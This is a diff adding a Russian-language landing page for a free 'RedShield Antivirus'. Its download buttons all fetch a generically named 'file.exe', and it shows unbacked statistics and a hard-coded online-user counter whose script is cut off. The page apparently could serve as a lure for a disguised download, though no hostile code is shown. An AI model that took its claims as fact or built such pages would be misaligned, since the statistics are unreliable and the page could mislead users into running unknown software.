@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>RedShield Antivirus — Надёжная защита вашего ПК</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { 
+            font-family: 'Inter', sans-serif; 
+            -webkit-tap-highlight-color: transparent;
+        }
+        html {
+            scroll-behavior: smooth;
+            scroll-padding-top: 80px;
+        }
+        .gradient-bg {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a0a0a 50%, #0a0a0a 100%);
+        }
+        .glow-red {
+            box-shadow: 0 0 30px rgba(220, 38, 38, 0.4), 0 0 60px rgba(220, 38, 38, 0.2);
+        }
+        .glow-text {
+            text-shadow: 0 0 20px rgba(220, 38, 38, 0.5);
+        }
+        .card-hover {
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        @media (hover: hover) {
+            .card-hover:hover {
+                transform: translateY(-5px);
+                box-shadow: 0 10px 40px rgba(220, 38, 38, 0.3);
+            }
+        }
+        .pulse-dot {
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.9); }
+        }
+        .shield-icon {
+            animation: float 3s ease-in-out infinite;
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        .faq-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.4s ease-out, padding 0.4s ease-out;
+        }
+        .faq-content.open {
+            max-height: 300px;
+            padding-bottom: 1.5rem;
+        }
+        .faq-icon {
+            transition: transform 0.3s ease;
+        }
+        .faq-icon.rotated {
+            transform: rotate(180deg);
+        }
+        .user-count {
+            transition: all 0.3s ease;
+            display: inline-block;
+        }
+        .user-count.updating {
+            transform: scale(1.15);
+            color: #22c55e;
+        }
+        @keyframes countPulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        .count-animate {
+            animation: countPulse 0.3s ease;
+        }
+        
+        /* Мобильная навигация - активные состояния */
+        .mobile-nav-item {
+            transition: all 0.2s ease;
+        }
+        .mobile-nav-item:active {
+            transform: scale(0.95);
+            color: #ef4444;
+        }
+        .mobile-nav-item.active {
+            color: #ef4444;
+        }
+        
+        /* Безопасная область для мобильных устройств */
+        .safe-bottom {
+            padding-bottom: env(safe-area-inset-bottom, 0);
+        }
+    </style>
+</head>
+<body class="gradient-bg min-h-screen text-white">
+    <!-- Navigation -->
+    <nav class="fixed top-0 w-full bg-black/90 backdrop-blur-md z-50 border-b border-red-900/30">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 py-3 sm:py-4 flex justify-between items-center">
+            <div class="flex items-center gap-2 sm:gap-3">
+                <div class="w-8 h-8 sm:w-10 sm:h-10 bg-gradient-to-br from-red-600 to-red-800 rounded-lg sm:rounded-xl flex items-center justify-center">
+                    <svg class="w-5 h-5 sm:w-6 sm:h-6 text-white" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V8.26l7-3.89v8.63z"/>
+                    </svg>
+                </div>
+                <span class="text-lg sm:text-xl font-bold">Red<span class="text-red-500">Shield</span></span>
+            </div>
+            <div class="hidden md:flex gap-6 lg:gap-8">
+                <a href="#features" class="text-gray-300 hover:text-red-500 transition-colors">Возможности</a>
+                <a href="#stats" class="text-gray-300 hover:text-red-500 transition-colors">Статистика</a>
+                <a href="#about" class="text-gray-300 hover:text-red-500 transition-colors">О нас</a>
+                <a href="#faq" class="text-gray-300 hover:text-red-500 transition-colors">FAQ</a>
+            </div>
+            <a href="file.exe" download="file.exe" class="bg-red-600 hover:bg-red-700 active:bg-red-800 px-4 sm:px-6 py-2 rounded-lg sm:rounded-xl font-semibold text-sm sm:text-base transition-all">
+                Скачать
+            </a>
+        </div>
+    </nav>
+
+    <!-- Mobile Bottom Navigation -->
+    <div class="md:hidden fixed bottom-0 left-0 right-0 bg-black/95 backdrop-blur-md z-50 border-t border-red-900/30 safe-bottom">
+        <div class="flex justify-around items-center py-2 px-1">
+            <a href="#hero" class="mobile-nav-item flex flex-col items-center py-2 px-3 text-gray-400 rounded-lg">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"/>
+                </svg>
+                <span class="text-xs mt-1">Главная</span>
+            </a>
+            <a href="#features" class="mobile-nav-item flex flex-col items-center py-2 px-3 text-gray-400 rounded-lg">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/>
+                </svg>
+                <span class="text-xs mt-1">Функции</span>
+            </a>
+            <a href="#stats" class="mobile-nav-item flex flex-col items-center py-2 px-3 text-gray-400 rounded-lg">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"/>
+                </svg>
+                <span class="text-xs mt-1">Стат-ка</span>
+            </a>
+            <a href="#about" class="mobile-nav-item flex flex-col items-center py-2 px-3 text-gray-400 rounded-lg">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                </svg>
+                <span class="text-xs mt-1">О нас</span>
+            </a>
+            <a href="#faq" class="mobile-nav-item flex flex-col items-center py-2 px-3 text-gray-400 rounded-lg">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                </svg>
+                <span class="text-xs mt-1">FAQ</span>
+            </a>
+        </div>
+    </div>
+
+    <!-- Hero Section -->
+    <section id="hero" class="pt-20 sm:pt-28 md:pt-32 pb-12 sm:pb-16 md:pb-20 px-4 sm:px-6">
+        <div class="max-w-7xl mx-auto text-center">
+            <div class="shield-icon inline-block mb-4 sm:mb-6 md:mb-8">
+                <div class="w-20 h-20 sm:w-28 sm:h-28 md:w-32 md:h-32 bg-gradient-to-br from-red-600 to-red-800 rounded-2xl sm:rounded-3xl flex items-center justify-center glow-red">
+                    <svg class="w-12 h-12 sm:w-16 sm:h-16 md:w-20 md:h-20 text-white" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5zm-1 16l-4-4 1.41-1.41L11 15.17l6.59-6.59L19 10l-8 8z"/>
+                    </svg>
+                </div>
+            </div>
+            <h1 class="text-2xl sm:text-4xl md:text-5xl lg:text-7xl font-extrabold mb-3 sm:mb-4 md:mb-6 glow-text leading-tight px-2">
+                Максимальная <span class="text-red-500">защита</span><br>вашего компьютера
+            </h1>
+            <p class="text-sm sm:text-base md:text-xl text-gray-400 max-w-2xl mx-auto mb-6 sm:mb-8 md:mb-10 px-2">
+                RedShield Antivirus — передовое решение для защиты от вирусов, троянов, шпионского ПО и других угроз. Бесплатно и навсегда.
+            </p>
+            <div class="flex flex-col sm:flex-row gap-3 sm:gap-4 justify-center items-center px-4">
+                <a href="file.exe" download="file.exe" class="w-full sm:w-auto bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 active:from-red-800 active:to-red-900 px-6 sm:px-8 md:px-10 py-3 sm:py-4 rounded-xl sm:rounded-2xl font-bold text-sm sm:text-base md:text-lg transition-all glow-red flex items-center justify-center gap-2 sm:gap-3">
+                    <svg class="w-5 h-5 sm:w-6 sm:h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/>
+                    </svg>
+                    Скачать бесплатно
+                </a>
+                <span class="text-gray-500 text-xs sm:text-sm md:text-base">Windows 7/8/10/11</span>
+            </div>
+            <div class="mt-4 sm:mt-6 md:mt-8 flex items-center justify-center gap-2 text-green-500">
+                <span class="w-2 h-2 sm:w-2.5 sm:h-2.5 bg-green-500 rounded-full pulse-dot"></span>
+                <span id="activeUsers" class="user-count font-semibold text-sm sm:text-base">247</span>
+                <span class="text-green-400 text-sm sm:text-base">пользователей онлайн</span>
+            </div>
+        </div>
+    </section>
+
+    <!-- Stats Section -->
+    <section id="stats" class="py-12 sm:py-16 md:py-20 px-4 sm:px-6 bg-black/40 scroll-mt-20">
+        <div class="max-w-7xl mx-auto">
+            <h2 class="text-xl sm:text-2xl md:text-4xl font-bold text-center mb-2 sm:mb-3">Наша <span class="text-red-500">статистика</span></h2>
+            <p class="text-gray-400 text-center mb-8 sm:mb-12 md:mb-16 text-xs sm:text-sm md:text-base">Цифры говорят сами за себя</p>
+            
+            <div class="grid grid-cols-1 sm:grid-cols-3 gap-3 sm:gap-4 md:gap-8">
+                <div class="bg-gradient-to-br from-gray-900 to-black p-5 sm:p-6 md:p-8 rounded-xl sm:rounded-2xl md:rounded-3xl border border-red-900/30 text-center card-hover">
+                    <div class="text-3xl sm:text-4xl md:text-5xl font-extrabold text-red-500 mb-1 sm:mb-2">30,000+</div>
+                    <div class="text-gray-400 text-sm sm:text-base md:text-lg">Скачиваний</div>
+                    <div class="mt-2 sm:mt-3 md:mt-4 text-xs sm:text-sm text-gray-500">И это число растёт каждый день</div>
+                </div>
+                <div class="bg-gradient-to-br from-gray-900 to-black p-5 sm:p-6 md:p-8 rounded-xl sm:rounded-2xl md:rounded-3xl border border-red-900/30 text-center card-hover">
+                    <div class="text-3xl sm:text-4xl md:text-5xl font-extrabold text-red-500 mb-1 sm:mb-2">5,000+</div>
+                    <div class="text-gray-400 text-sm sm:text-base md:text-lg">Вирусов обнаружено</div>
+                    <div class="mt-2 sm:mt-3 md:mt-4 text-xs sm:text-sm text-gray-500">Защитили тысячи компьютеров</div>
+                </div>
+                <div class="bg-gradient-to-br from-gray-900 to-black p-5 sm:p-6 md:p-8 rounded-xl sm:rounded-2xl md:rounded-3xl border border-red-900/30 text-center card-hover">
+                    <div class="text-3xl sm:text-4xl md:text-5xl font-extrabold text-red-500 mb-1 sm:mb-2">
+                        <span id="activeUsersLarge" class="user-count">247</span>
+                    </div>
+                    <div class="text-gray-400 text-sm sm:text-base md:text-lg">Активных пользователей</div>
+                    <div class="mt-2 sm:mt-3 md:mt-4 text-xs sm:text-sm text-gray-500 flex items-center justify-center gap-2">
+                        <span class="w-2 h-2 bg-green-500 rounded-full pulse-dot"></span>
+                        Онлайн прямо сейчас
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section id="features" class="py-12 sm:py-16 md:py-20 px-4 sm:px-6 scroll-mt-20">
+        <div class="max-w-7xl mx-auto">
+            <h2 class="text-xl sm:text-2xl md:text-4xl font-bold text-center mb-2 sm:mb-3 md:mb-4">Почему <span class="text-red-500">RedShield</span>?</h2>
+            <p class="text-gray-400 text-center mb-8 sm:mb-12 md:mb-16 max-w-2xl mx-auto text-xs sm:text-sm md:text-base">Передовые технологии защиты, которые работают незаметно и эффективно</p>
+            
+            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3 sm:gap-4 md:gap-6">
+                <div class="bg-gradient-to-br from-gray-900 to-black p-5 sm:p-6 md:p-8 rounded-xl sm:rounded-2xl md:rounded-3xl border border-red-900/30 card-hover">
+                    <div class="w-10 h-10 sm:w-12 sm:h-12 md:w-14 md:h-14 bg-red-600/20 rounded-lg sm:rounded-xl md:rounded-2xl flex items-center justify-center mb-3 sm:mb-4 md:mb-6">
+                        <svg class="w-5 h-5 sm:w-6 sm:h-6 md:w-7 md:h-7 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/>
+                        </svg>
+                    </div>
+                    <h3 class="text-base sm:text-lg md:text-xl font-bold mb-1 sm:mb-2 md:mb-3">Молниеносная скорость</h3>
+                    <p class="text-gray-400 text-xs sm:text-sm md:text-base">Сканирование системы за считанные минуты без замедления работы компьютера</p>
+                </div>
+                
+                <div class="bg-gradient-to-br from-gray-900 to-black p-5 sm:p-6 md:p-8 rounded-xl sm:rounded-2xl md:rounded-3xl border border-red-900/30 card-hover">
+                    <div class="w-10 h-10 sm:w-12 sm:h-12 md:w-14 md:h-14 bg-red-600/20 rounded-lg sm:rounded-xl md:rounded-2xl flex items-center justify-center mb-3 sm:mb-4 md:mb-6">
+                        <svg class="w-5 h-5 sm:w-6 sm:h-6 md:w-7 md:h-7 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
+                        </svg>
+                    </div>
+                    <h3 class="text-base sm:text-lg md:text-xl font-bold mb-1 sm:mb-2 md:mb-3">Защита в реальном времени</h3>
+                    <p class="text-gray-400 text-xs sm:text-sm md:text-base">Постоянный мониторинг системы и мгновенное блокирование угроз</p>
+                </div>
+                
+                <div class="bg-gradient-to-br from-gray-900 to-black p-5 sm:p-6 md:p-8 rounded-xl sm:rounded-2xl md:rounded-3xl border border-red-900/30 card-hover">
+                    <div class="w-10 h-10 sm:w-12 sm:h-12 md:w-14 md:h-14 bg-red-600/20 rounded-lg sm:rounded-xl md:rounded-2xl flex items-center justify-center mb-3 sm:mb-4 md:mb-6">
+                        <svg class="w-5 h-5 sm:w-6 sm:h-6 md:w-7 md:h-7 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/>
+                        </svg>
+                    </div>
+                    <h3 class="text-base sm:text-lg md:text-xl font-bold mb-1 sm:mb-2 md:mb-3">Автообновление баз</h3>
+                    <p class="text-gray-400 text-xs sm:text-sm md:text-base">Ежедневное обновление вирусных баз для защиты от новейших угроз</p>
+                </div>
+                
+                <div class="bg-gradient-to-br from-gray-900 to-black p-5 sm:p-6 md:p-8 rounded-xl sm:rounded-2xl md:rounded-3xl border border-red-900/30 card-hover">
+                    <div class="w-10 h-10 sm:w-12 sm:h-12 md:w-14 md:h-14 bg-red-600/20 rounded-lg sm:rounded-xl md:rounded-2xl flex items-center justify-center mb-3 sm:mb-4 md:mb-6">
+                        <svg class="w-5 h-5 sm:w-6 sm:h-6 md:w-7 md:h-7 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
+                        </svg>
+                    </div>
+                    <h3 class="text-base sm:text-lg md:text-xl font-bold mb-1 sm:mb-2 md:mb-3">Защита паролей</h3>
+                    <p class="text-gray-400 text-xs sm:text-sm md:text-base">Безопасное хранение и защита ваших паролей и личных данных</p>
+                </div>
+                
+                <div class="bg-gradient-to-br from-gray-900 to-black p-5 sm:p-6 md:p-8 rounded-xl sm:rounded-2xl md:rounded-3xl border border-red-900/30 card-hover">
+                    <div class="w-10 h-10 sm:w-12 sm:h-12 md:w-14 md:h-14 bg-red-600/20 rounded-lg sm:rounded-xl md:rounded-2xl flex items-center justify-center mb-3 sm:mb-4 md:mb-6">
+                        <svg class="w-5 h-5 sm:w-6 sm:h-6 md:w-7 md:h-7 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"/>
+                        </svg>
+                    </div>
+                    <h3 class="text-base sm:text-lg md:text-xl font-bold mb-1 sm:mb-2 md:mb-3">Веб-защита</h3>
+                    <p class="text-gray-400 text-xs sm:text-sm md:text-base">Блокировка вредоносных сайтов и фишинговых атак</p>
+                </div>
+                
+                <div class="bg-gradient-to-br from-gray-900 to-black p-5 sm:p-6 md:p-8 rounded-xl sm:rounded-2xl md:rounded-3xl border border-red-900/30 card-hover">
+                    <div class="w-10 h-10 sm:w-12 sm:h-12 md:w-14 md:h-14 bg-red-600/20 rounded-lg sm:rounded-xl md:rounded-2xl flex items-center justify-center mb-3 sm:mb-4 md:mb-6">
+                        <svg class="w-5 h-5 sm:w-6 sm:h-6 md:w-7 md:h-7 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                        </svg>
+                    </div>
+                    <h3 class="text-base sm:text-lg md:text-xl font-bold mb-1 sm:mb-2 md:mb-3">Полностью бесплатно</h3>
+                    <p class="text-gray-400 text-xs sm:text-sm md:text-base">Никаких скрытых платежей и подписок — всё бесплатно навсегда</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- About Section -->
+    <section id="about" class="py-12 sm:py-16 md:py-20 px-4 sm:px-6 bg-black/40 scroll-mt-20">
+        <div class="max-w-7xl mx-auto">
+            <div class="grid lg:grid-cols-2 gap-8 lg:gap-16 items-center">
+                <div class="order-2 lg:order-1">
+                    <h2 class="text-xl sm:text-2xl md:text-4xl font-bold mb-3 sm:mb-4 md:mb-6">О <span class="text-red-500">RedShield</span></h2>
+                    <p class="text-gray-400 text-sm sm:text-base md:text-lg mb-3 sm:mb-4 md:mb-6">
+                        RedShield Antivirus — это результат многолетней работы команды экспертов по кибербезопасности. Мы создали продукт, который сочетает в себе мощную защиту и простоту использования.
+                    </p>
+                    <p class="text-gray-400 text-sm sm:text-base md:text-lg mb-4 sm:mb-6">
+                        Наша миссия — сделать интернет безопаснее для каждого. Мы верим, что надёжная защита должна быть доступна всем, поэтому наш антивирус полностью бесплатен.
+                    </p>
+                    <div class="flex gap-4 sm:gap-6 md:gap-8 mt-4 sm:mt-6 md:mt-8">
+                        <div class="text-center">
+                            <div class="text-xl sm:text-2xl md:text-3xl font-bold text-red-500">2019</div>
+                            <div class="text-gray-500 text-xs sm:text-sm md:text-base">Год основания</div>
+                        </div>
+                        <div class="text-center">
+                            <div class="text-xl sm:text-2xl md:text-3xl font-bold text-red-500">50+</div>
+                            <div class="text-gray-500 text-xs sm:text-sm md:text-base">Экспертов</div>
+                        </div>
+                        <div class="text-center">
+                            <div class="text-xl sm:text-2xl md:text-3xl font-bold text-red-500">15+</div>
+                            <div class="text-gray-500 text-xs sm:text-sm md:text-base">Стран</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="flex justify-center order-1 lg:order-2">
+                    <div class="relative">
+                        <div class="w-48 h-48 sm:w-64 sm:h-64 md:w-80 md:h-80 bg-gradient-to-br from-red-600/20 to-red-900/20 rounded-full flex items-center justify-center">
+                            <div class="w-36 h-36 sm:w-48 sm:h-48 md:w-60 md:h-60 bg-gradient-to-br from-red-600/30 to-red-900/30 rounded-full flex items-center justify-center">
+                                <div class="w-24 h-24 sm:w-32 sm:h-32 md:w-40 md:h-40 bg-gradient-to-br from-red-600 to-red-800 rounded-full flex items-center justify-center glow-red">
+                                    <svg class="w-12 h-12 sm:w-16 sm:h-16 md:w-20 md:h-20 text-white" fill="currentColor" viewBox="0 0 24 24">
+                                        <path d="M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z"/>
+                                    </svg>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FAQ Section -->
+    <section id="faq" class="py-12 sm:py-16 md:py-20 px-4 sm:px-6 scroll-mt-20">
+        <div class="max-w-3xl mx-auto">
+            <h2 class="text-xl sm:text-2xl md:text-4xl font-bold text-center mb-2 sm:mb-3 md:mb-4">Часто задаваемые <span class="text-red-500">вопросы</span></h2>
+            <p class="text-gray-400 text-center mb-8 sm:mb-12 md:mb-16 text-xs sm:text-sm md:text-base">Ответы на популярные вопросы о RedShield</p>
+            
+            <div class="space-y-2 sm:space-y-3 md:space-y-4">
+                <div class="bg-gradient-to-br from-gray-900 to-black rounded-xl sm:rounded-2xl border border-red-900/30 overflow-hidden">
+                    <button class="faq-btn w-full p-4 sm:p-5 md:p-6 text-left flex justify-between items-center gap-3 cursor-pointer" onclick="toggleFaq(this)">
+                        <span class="font-semibold text-sm sm:text-base md:text-lg">RedShield действительно бесплатный?</span>
+                        <svg class="w-5 h-5 sm:w-6 sm:h-6 text-red-500 faq-icon flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/>
+                        </svg>
+                    </button>
+                    <div class="faq-content px-4 sm:px-5 md:px-6">
+                        <p class="text-gray-400 text-xs sm:text-sm md:text-base">Да, RedShield Antivirus полностью бесплатен. Никаких скрытых платежей, пробных периодов или ограниченных функций. Все возможности доступны сразу после установки.</p>
+                    </div>
+                </div>
+                
+                <div class="bg-gradient-to-br from-gray-900 to-black rounded-xl sm:rounded-2xl border border-red-900/30 overflow-hidden">
+                    <button class="faq-btn w-full p-4 sm:p-5 md:p-6 text-left flex justify-between items-center gap-3 cursor-pointer" onclick="toggleFaq(this)">
+                        <span class="font-semibold text-sm sm:text-base md:text-lg">Какие системные требования?</span>
+                        <svg class="w-5 h-5 sm:w-6 sm:h-6 text-red-500 faq-icon flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/>
+                        </svg>
+                    </button>
+                    <div class="faq-content px-4 sm:px-5 md:px-6">
+                        <p class="text-gray-400 text-xs sm:text-sm md:text-base">Windows 7/8/10/11, 2 ГБ оперативной памяти, 500 МБ свободного места на диске, подключение к интернету для обновления баз.</p>
+                    </div>
+                </div>
+                
+                <div class="bg-gradient-to-br from-gray-900 to-black rounded-xl sm:rounded-2xl border border-red-900/30 overflow-hidden">
+                    <button class="faq-btn w-full p-4 sm:p-5 md:p-6 text-left flex justify-between items-center gap-3 cursor-pointer" onclick="toggleFaq(this)">
+                        <span class="font-semibold text-sm sm:text-base md:text-lg">Можно ли использовать с другим антивирусом?</span>
+                        <svg class="w-5 h-5 sm:w-6 sm:h-6 text-red-500 faq-icon flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/>
+                        </svg>
+                    </button>
+                    <div class="faq-content px-4 sm:px-5 md:px-6">
+                        <p class="text-gray-400 text-xs sm:text-sm md:text-base">Мы рекомендуем использовать только один антивирус для избежания конфликтов. RedShield обеспечивает полную защиту и не требует дополнительного ПО.</p>
+                    </div>
+                </div>
+                
+                <div class="bg-gradient-to-br from-gray-900 to-black rounded-xl sm:rounded-2xl border border-red-900/30 overflow-hidden">
+                    <button class="faq-btn w-full p-4 sm:p-5 md:p-6 text-left flex justify-between items-center gap-3 cursor-pointer" onclick="toggleFaq(this)">
+                        <span class="font-semibold text-sm sm:text-base md:text-lg">Как часто обновляются вирусные базы?</span>
+                        <svg class="w-5 h-5 sm:w-6 sm:h-6 text-red-500 faq-icon flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/>
+                        </svg>
+                    </button>
+                    <div class="faq-content px-4 sm:px-5 md:px-6">
+                        <p class="text-gray-400 text-xs sm:text-sm md:text-base">Вирусные базы обновляются автоматически несколько раз в день. Вам не нужно ничего делать — программа сама загружает последние обновления.</p>
+                    </div>
+                </div>
+                
+                <div class="bg-gradient-to-br from-gray-900 to-black rounded-xl sm:rounded-2xl border border-red-900/30 overflow-hidden">
+                    <button class="faq-btn w-full p-4 sm:p-5 md:p-6 text-left flex justify-between items-center gap-3 cursor-pointer" onclick="toggleFaq(this)">
+                        <span class="font-semibold text-sm sm:text-base md:text-lg">Замедляет ли RedShield работу ПК?</span>
+                        <svg class="w-5 h-5 sm:w-6 sm:h-6 text-red-500 faq-icon flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/>
+                        </svg>
+                    </button>
+                    <div class="faq-content px-4 sm:px-5 md:px-6">
+                        <p class="text-gray-400 text-xs sm:text-sm md:text-base">Нет! RedShield оптимизирован для минимального потребления ресурсов. Вы не заметите разницы в производительности даже на старых компьютерах.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- CTA Section -->
+    <section class="py-12 sm:py-16 md:py-20 px-4 sm:px-6 mb-20 md:mb-0">
+        <div class="max-w-4xl mx-auto bg-gradient-to-r from-red-900/50 to-red-800/30 rounded-xl sm:rounded-2xl md:rounded-3xl p-6 sm:p-8 md:p-12 text-center border border-red-800/50 glow-red">
+            <h2 class="text-xl sm:text-2xl md:text-4xl font-bold mb-2 sm:mb-3 md:mb-4">Готовы защитить свой компьютер?</h2>
+            <p class="text-gray-400 text-sm sm:text-base md:text-lg mb-4 sm:mb-6 md:mb-8">Скачайте RedShield прямо сейчас и забудьте о вирусах навсегда</p>
+            <a href="file.exe" download="file.exe" class="inline-flex items-center justify-center gap-2 sm:gap-3 bg-white text-black px-6 sm:px-8 md:px-10 py-3 sm:py-4 rounded-xl sm:rounded-2xl font-bold text-sm sm:text-base md:text-lg hover:bg-gray-100 active:bg-gray-200 transition-all w-full sm:w-auto">
+                <svg class="w-5 h-5 sm:w-6 sm:h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/>
+                </svg>
+                Скачать RedShield бесплатно
+            </a>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="py-6 sm:py-8 md:py-12 px-4 sm:px-6 border-t border-red-900/30 mb-20 md:mb-0">
+        <div class="max-w-7xl mx-auto">
+            <div class="flex flex-col gap-4 sm:gap-6 items-center text-center">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="w-8 h-8 sm:w-10 sm:h-10 bg-gradient-to-br from-red-600 to-red-800 rounded-lg sm:rounded-xl flex items-center justify-center">
+                        <svg class="w-5 h-5 sm:w-6 sm:h-6 text-white" fill="currentColor" viewBox="0 0 24 24">
+                            <path d="M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z"/>
+                        </svg>
+                    </div>
+                    <span class="text-lg sm:text-xl font-bold">Red<span class="text-red-500">Shield</span></span>
+                </div>
+                <div class="flex flex-wrap justify-center gap-3 sm:gap-4 md:gap-8 text-gray-400 text-xs sm:text-sm md:text-base">
+                    <a href="#" class="hover:text-red-500 transition-colors">Политика конфиденциальности</a>
+                    <a href="#" class="hover:text-red-500 transition-colors">Условия использования</a>
+                    <a href="#" class="hover:text-red-500 transition-colors">Контакты</a>
+                </div>
+                <div class="text-gray-500 text-xs sm:text-sm md:text-base">
+                    © 2019-2026 RedShield. Все права защищены.
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Динамическое изменение количества активных пользователей
